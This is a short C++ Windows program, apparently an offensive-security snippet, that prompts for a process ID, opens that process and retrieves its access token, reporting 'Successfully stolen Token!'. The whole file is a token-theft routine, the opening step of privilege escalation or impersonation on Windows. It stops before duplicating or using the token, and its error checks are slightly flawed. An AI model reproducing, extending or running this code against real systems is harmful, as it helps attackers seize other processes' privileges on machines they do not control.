
#include <windows.h>
#include <iostream>


using namespace std;

int pid;
HANDLE hprocess; 
bool hprocesstoken;
HANDLE Token;



bool stealToken(int pid){

    hprocess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, pid);

    if(hprocess == NULL){
        cout << "[!] Could not get process handle!";
        return false;
    }
    
    hprocesstoken = OpenProcessToken(hprocess, MAXIMUM_ALLOWED, &Token);

    if(hprocesstoken == NULL){
        cout << "[!] Could not get process token!";
        return false;
    }

    cout << "[+] Successfully stolen Token!: " << Token;
    return true;   



}

int main(){
    cout << "Whats the PID of the Process: ";
    cin >> pid;

    stealToken(pid);

}




